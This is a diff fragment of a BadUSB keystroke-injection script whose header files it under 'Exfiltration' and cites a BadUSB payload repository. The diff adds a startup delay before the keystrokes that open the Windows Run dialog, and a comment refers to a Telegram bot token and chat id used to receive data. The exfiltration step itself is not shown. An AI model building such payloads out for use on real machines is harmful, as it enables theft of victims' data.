@@ -6,6 +6,7 @@ REM Version:	1.0
 REM Category:	Exfiltration
 REM Source: https://github.com/Mr-Proxy-source/BadUSB-Payloads
 
+DELAY 1000
 GUI r
 DELAY 500
 REM If you want to use Telegram change just bot token and chat id
